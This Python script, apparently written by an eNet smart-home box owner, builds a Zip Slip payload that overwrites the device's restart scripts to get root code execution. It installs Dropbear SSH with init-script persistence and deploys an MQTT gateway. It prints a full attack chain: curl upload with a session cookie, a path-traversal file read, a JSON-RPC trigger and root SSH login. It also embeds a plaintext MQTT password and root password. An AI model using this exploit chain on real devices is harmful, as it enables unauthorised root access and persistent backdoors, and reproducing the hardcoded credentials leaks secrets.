#!/usr/bin/env python3
"""
build_unified_payload.py
========================
Bygger én ZIP-fil der i én operation:
  1. Installerer Dropbear SSH permanent på eNet-boksen
  2. Deployer MQTT-gateway bundlen (enet-mqtt-2.0-PRODUCTION.jar)
  3. Konfigurerer Felix til at auto-loade bundlen
  4. Sætter alt op til at overleve genstart

Kræver:
  - Den kompilerede MQTT JAR: felix/target/enet-mqtt-2.0-PRODUCTION.jar
  - Dropbear ARMv7l static binary: dropbearmulti (valgfri)
  - INSTASESSIONID cookie fra eNet webinterfacet

Output:
  - payload_unified.zip — uploades til eNet-boksen via curl

Se også: install_guide.md for fuld dokumentation
"""

import zipfile
import os
import sys

# ============================================================
# KONFIGURATION — Tilpas disse værdier
# ============================================================

# MQTT Broker (der hvor Home Assistant eller din broker kører)
MQTT_BROKER_HOST = "10.0.0.6"
MQTT_BROKER_PORT = 1883             # 1883 for production, 11883 for local dev
MQTT_USER = "homeassistant"
MQTT_PASS = "eih3Soh8Ioceon5ughawief2Chahn3aeShieW3queisee9zohch0ephaew0shaid"

# Sti til den kompilerede MQTT JAR
MQTT_JAR_PATH = "felix/target/enet-mqtt-2.0-PRODUCTION.jar"

# Dropbear statisk ARMv7l binary (None = inkluder ikke, installer vil bruge eksisterende)
DROPBEAR_BINARY_PATH = "dropbearmulti"

# Stier på eNet-boksen
ENET_RESTART_FELIX  = "../../../../../../home/insta/felix-framework/script/restartFelix"
ENET_RESET_SYSTEM   = "../../../../../../home/insta/felix-framework/script/resetSystem"
ENET_BUNDLE_DIR     = "../../../../../../home/insta/felix-framework/bundle/startlevel4"
ENET_BUNDLE_FILE    = "enet-mqtt-2.0-PRODUCTION.jar"
ENET_DROPBEAR_PATH  = "../../../../../../usr/sbin/dropbearmulti"
ENET_INIT_SCRIPT    = "/etc/init.d/felix.sh"
ENET_CONFIG_PROP    = "/home/insta/felix-framework/conf/config.properties"
ENET_MQTT_PROP      = "/home/insta/felix-framework/conf/mqtt-gateway.properties"


def get_dropbear_binary():
    """Returner bytes for dropbearmulti statisk ARMv7l binary."""
    if DROPBEAR_BINARY_PATH and os.path.exists(DROPBEAR_BINARY_PATH):
        print(f"[OK] Bruger lokal dropbear binary: {DROPBEAR_BINARY_PATH}")
        with open(DROPBEAR_BINARY_PATH, "rb") as f:
            data = f.read()
        print(f"    Storrelse: {len(data)} bytes ({len(data)/1024:.1f} KB)")
        return data

    print("""
+------------------------------------------------------------------+
| WARNING: Dropbear binary ikke fundet!                            |
|                                                                  |
| Installer-scriptet pa boksen vil forsoege at bruge den           |
| eksisterende dropbear hvis den findes i Yocto/Poky.              |
|                                                                  |
| For at inkludere en statisk ARMv7l dropbearmulti i payload:      |
|                                                                  |
|   git clone https://github.com/mkj/dropbear.git                  |
|   cd dropbear                                                    |
|   ./configure --host=arm-linux-gnueabihf --enable-static         |
|               --disable-zlib --disable-syslog                    |
|   make -j4 PROGRAMS="dropbear dropbearkey scp dbclient"          |
|          MULTI=1 STATIC=1                                        |
|   cp dropbearmulti ../enet/dropbearmulti                         |
|                                                                  |
|   # Alternativt: extraher fra en Yocto/Poky build:               |
|   find tmp/work/ -name dropbearmulti -type f                     |
+------------------------------------------------------------------+
""")
    return None


def build_installer_script():
    """Bygger shell-script der overskrives ind i restartFelix/resetSystem."""

    mqtt_uri = f"tcp://{MQTT_BROKER_HOST}:{MQTT_BROKER_PORT}"

    script = f'''#!/bin/sh
# ============================================================
# eNet Unified Installer — Korer som root via Zip Slip RCE
# Installerer Dropbear SSH + MQTT Gateway i en operation
# ============================================================
set -e

LOG="/tmp/enet_install.log"
exec > "$LOG" 2>&1
echo "================================================"
echo " eNet Unified Installer — Starter $(date)"
echo "================================================"

echo "[1/6] Remounting filesystem as read-write..."
mount -o remount,rw / 2>/dev/null || true
echo "  Filesystem remount attempted"

echo "[2/6] Installing Dropbear SSH server..."

DROPBEAR_BIN=""
DROPBEARKEY_BIN=""

if command -v dropbear >/dev/null 2>&1; then
    echo "  [OK] dropbear already exists in PATH"
    DROPBEAR_BIN="dropbear"
elif [ -x /usr/sbin/dropbear ]; then
    echo "  [OK] Found /usr/sbin/dropbear"
    DROPBEAR_BIN="/usr/sbin/dropbear"
elif [ -x /usr/sbin/dropbearmulti ]; then
    echo "  [OK] Found dropbearmulti — creating symlinks..."
    DROPBEAR_BIN="/usr/sbin/dropbearmulti dropbear"
    DROPBEARKEY_BIN="/usr/sbin/dropbearmulti dropbearkey"
    ln -sf /usr/sbin/dropbearmulti /usr/sbin/dropbear 2>/dev/null || true
    ln -sf /usr/sbin/dropbearmulti /usr/bin/dropbearkey 2>/dev/null || true
    ln -sf /usr/sbin/dropbearmulti /usr/bin/scp 2>/dev/null || true
    ln -sf /usr/sbin/dropbearmulti /usr/bin/dbclient 2>/dev/null || true
else
    echo "  [ERROR] No dropbear binary found! SSH will not be available."
fi

if [ -z "$DROPBEARKEY_BIN" ]; then
    if command -v dropbearkey >/dev/null 2>&1; then
        DROPBEARKEY_BIN="dropbearkey"
    elif [ -x /usr/bin/dropbearkey ]; then
        DROPBEARKEY_BIN="/usr/bin/dropbearkey"
    fi
fi

if [ -n "$DROPBEARKEY_BIN" ]; then
    mkdir -p /etc/dropbear
    if [ ! -f /etc/dropbear/dropbear_rsa_host_key ]; then
        echo "  Generating RSA host key..."
        $DROPBEARKEY_BIN -t rsa -f /etc/dropbear/dropbear_rsa_host_key 2>/dev/null || true
    fi
    if [ ! -f /etc/dropbear/dropbear_ecdsa_host_key ]; then
        echo "  Generating ECDSA host key..."
        $DROPBEARKEY_BIN -t ecdsa -f /etc/dropbear/dropbear_ecdsa_host_key 2>/dev/null || true
    fi
    if [ ! -f /etc/dropbear/dropbear_ed25519_host_key ]; then
        echo "  Generating Ed25519 host key..."
        $DROPBEARKEY_BIN -t ed25519 -f /etc/dropbear/dropbear_ed25519_host_key 2>/dev/null || true
    fi
else
    echo "  [WARN] dropbearkey not found — skipping host key generation"
fi

killall dropbear 2>/dev/null || true
sleep 1

if [ -n "$DROPBEAR_BIN" ]; then
    echo "  Starting Dropbear SSH on port 22..."
    $DROPBEAR_BIN -E -R -p 22 2>/tmp/dropbear.log &
    sleep 1
    if pidof dropbear >/dev/null 2>&1; then
        echo "  [OK] Dropbear SSH is running on port 22"
    else
        echo "  [WARN] Dropbear may not have started"
    fi
else
    echo "  [SKIP] No dropbear binary — SSH unavailable"
fi

echo "[3/6] Configuring MQTT Gateway..."

mkdir -p {os.path.dirname(ENET_MQTT_PROP)}

cat > {ENET_MQTT_PROP} << 'MQTTEOF'
# eNet Native MQTT Gateway Configuration
# Auto-generated by unified installer
MQTT_BROKER={mqtt_uri}
MQTT_USER={MQTT_USER}
MQTT_PASS={MQTT_PASS}
MQTTEOF

echo "  [OK] mqtt-gateway.properties written: {mqtt_uri}"

echo "[4/6] Verifying MQTT bundle..."

BUNDLE_JAR="{ENET_BUNDLE_DIR}/{ENET_BUNDLE_FILE}"
if [ -f "$BUNDLE_JAR" ]; then
    JAR_SIZE=$(ls -la "$BUNDLE_JAR" | awk '{{print $5}}')
    echo "  [OK] MQTT bundle found: $BUNDLE_JAR ($JAR_SIZE bytes)"
else
    echo "  [ERROR] MQTT bundle NOT found at $BUNDLE_JAR!"
fi

echo "[5/6] Updating Felix config.properties..."

CONFIG="{ENET_CONFIG_PROP}"
BUNDLE_URI="file:///home/insta/felix-framework/bundle/startlevel4/enet-mqtt-2.0-PRODUCTION.jar"

if [ -f "$CONFIG" ]; then
    cp "$CONFIG" "${{CONFIG}}.bak_$(date +%Y%m%d_%H%M%S)" 2>/dev/null || true

    if ! grep -q "enet-mqtt" "$CONFIG" 2>/dev/null; then
        echo "  Adding enet-mqtt to felix.auto.install.4..."
        echo "felix.auto.install.4=${{BUNDLE_URI}}" >> "$CONFIG"
        echo "  [OK] Added to felix.auto.install.4"
    else
        echo "  [SKIP] enet-mqtt already in config.properties"
    fi

    if ! grep -q "enet-mqtt" "$CONFIG" 2>/dev/null; then
        echo "felix.auto.start.4=${{BUNDLE_URI}}" >> "$CONFIG"
        echo "  [OK] Added to felix.auto.start.4"
    fi
else
    echo "  [ERROR] config.properties not found at $CONFIG"
fi

echo "[6/6] Setting up autostart persistence..."

INIT_SCRIPT="{ENET_INIT_SCRIPT}"

if [ -f "$INIT_SCRIPT" ]; then
    if ! grep -q "dropbear" "$INIT_SCRIPT" 2>/dev/null; then
        echo "  Injecting Dropbear startup into $INIT_SCRIPT..."
        cp "$INIT_SCRIPT" "${{INIT_SCRIPT}}.bak_$(date +%Y%m%d_%H%M%S)" 2>/dev/null || true

        awk '
            /^[[:space:]]*start[[:space:]]*)/ {{
                print
                print "    # === Auto-injected: Start Dropbear SSH ==="
                print "    echo \"Starting Dropbear SSH server...\""
                print "    if [ -x /usr/sbin/dropbearmulti ]; then"
                print "        /usr/sbin/dropbearmulti dropbear -E -R -p 22 &"
                print "    elif [ -x /usr/sbin/dropbear ]; then"
                print "        /usr/sbin/dropbear -E -R -p 22 &"
                print "    fi"
                print "    # ========================================="
                next
            }}
            {{ print }}
        ' "$INIT_SCRIPT" > /tmp/felix_init_new

        if [ -s /tmp/felix_init_new ]; then
            cat /tmp/felix_init_new > "$INIT_SCRIPT"
            chmod +x "$INIT_SCRIPT"
            echo "  [OK] init.d script updated with Dropbear autostart"
        fi
    else
        echo "  [SKIP] Dropbear already in init script"
    fi
else
    echo "  [WARN] Init script $INIT_SCRIPT not found"
fi

echo ""
echo "================================================"
echo " Installation complete at $(date)"
echo "================================================"
echo ""
echo "Summary:"
if pidof dropbear >/dev/null 2>&1; then
    echo "  SSH:  RUNNING on port 22"
else
    echo "  SSH:  NOT RUNNING"
fi
echo "  MQTT: $( [ -f "$BUNDLE_JAR" ] && echo "Bundle present" || echo "Bundle MISSING" )"
echo "  Config: $( [ -f "{ENET_MQTT_PROP}" ] && echo "OK" || echo "MISSING" )"
if grep -q dropbear "{ENET_INIT_SCRIPT}" 2>/dev/null; then
    echo "  Init:  Persistent (survives reboot)"
else
    echo "  Init:  NOT persistent"
fi
echo ""
echo "Log written to: $LOG"
'''

    return script


def build_payload():
    print("+==================================================================+")
    print("|     eNet Unified Payload Builder v2.0                            |")
    print("|     One ZIP -> SSH + MQTT + Config + Persistence                 |")
    print("+==================================================================+")
    print()

    # MQTT JAR
    mqtt_jar_data = None
    if os.path.exists(MQTT_JAR_PATH):
        with open(MQTT_JAR_PATH, "rb") as f:
            mqtt_jar_data = f.read()
        print(f"[OK] MQTT JAR loaded: {MQTT_JAR_PATH} ({len(mqtt_jar_data):,} bytes)")
    else:
        print(f"[!] MQTT JAR NOT FOUND: {MQTT_JAR_PATH}")
        print("    Build it first:  bash scripts/build.sh")
        choice = input("    Continue without MQTT JAR? (y/n): ").strip().lower()
        if choice != 'y':
            sys.exit(1)

    # Dropbear
    dropbear_data = get_dropbear_binary()
    dropbear_included = dropbear_data is not None

    # Installer script
    installer_script = build_installer_script()

    # Byg ZIP
    output_zip = "payload_unified.zip"
    print(f"\n[->] Building {output_zip}...")

    with zipfile.ZipFile(output_zip, "w", zipfile.ZIP_DEFLATED) as zf:
        # 1. Installer script -> restartFelix (PRIMARY TRIGGER)
        zf.writestr(ENET_RESTART_FELIX, installer_script.encode('utf-8'))
        print(f"    [+] {ENET_RESTART_FELIX} -> Installer script")

        # 2. Installer script -> resetSystem (BACKUP TRIGGER)
        zf.writestr(ENET_RESET_SYSTEM, installer_script.encode('utf-8'))
        print(f"    [+] {ENET_RESET_SYSTEM} -> Installer script (backup)")

        # 3. MQTT JAR på plads i bundle mappen
        if mqtt_jar_data:
            jar_path = f"{ENET_BUNDLE_DIR}/{ENET_BUNDLE_FILE}"
            zf.writestr(jar_path, mqtt_jar_data)
            print(f"    [+] {jar_path} -> MQTT bundle ({len(mqtt_jar_data):,} bytes)")

        # 4. Dropbear static binary
        if dropbear_included:
            zf.writestr(ENET_DROPBEAR_PATH, dropbear_data)
            print(f"    [+] {ENET_DROPBEAR_PATH} -> Dropbear binary ({len(dropbear_data):,} bytes)")
        else:
            print(f"    [*] Dropbear binary NOT included — installer will use existing binary")

        # 5. Dummy projektfil — snyder Java-validering
        zf.writestr("project/dummy_project.xml",
                     b'<?xml version="1.0"?><project name="dummy"/>')
        print(f"    [+] project/dummy_project.xml -> Validation bypass")

    zip_size = os.path.getsize(output_zip)
    print(f"\n[OK] {output_zip} created ({zip_size:,} bytes, {zip_size/1024:.1f} KB)")

    print(f"""
+==================================================================+
|                    UPLOAD INSTRUCTIONS                           |
+==================================================================+
|                                                                  |
|  1. Upload payload (udfyld SESSION med din cookie):              |
|     curl -v -X POST \\                                            |
|       -H "Cookie: INSTASESSIONID=$SESSION" \\                     |
|       -F "file=@payload_unified.zip" \\                           |
|       -F "project=projekt" \\                                     |
|       "http://10.0.0.9//storage/upload"                          |
|                                                                  |
|  2. Tjek at filerne er skrevet korrekt via LFI:                  |
|     curl -b "INSTASESSIONID=$SESSION" \\                          |
|       "http://10.0.0.9////////../../../../../../home/insta/       |
|        felix-framework/script/restartFelix"                       |
|                                                                  |
|  3. Trigger restart via JSON-RPC:                                |
|     curl -X POST \\                                               |
|       -H "Content-Type: application/json" \\                      |
|       -H "Cookie: INSTASESSIONID=$SESSION" \\                     |
|       -d '{{"method":"restartFelix","params":[],"id":1}}' \\       |
|       "http://10.0.0.9/jsonrpc"                                   |
|                                                                  |
|  4. Efter ~15 sekunder: SSH ind pa boksen:                       |
|     ssh root@10.0.0.9    (password: pvxtwl)                      |
|                                                                  |
|  5. Tjek log og verificer:                                       |
|     cat /tmp/enet_install.log                                    |
|     curl http://10.0.0.9:8090/mqtt?action=status                 |
|                                                                  |
+==================================================================+
""")


if __name__ == "__main__":
    build_payload()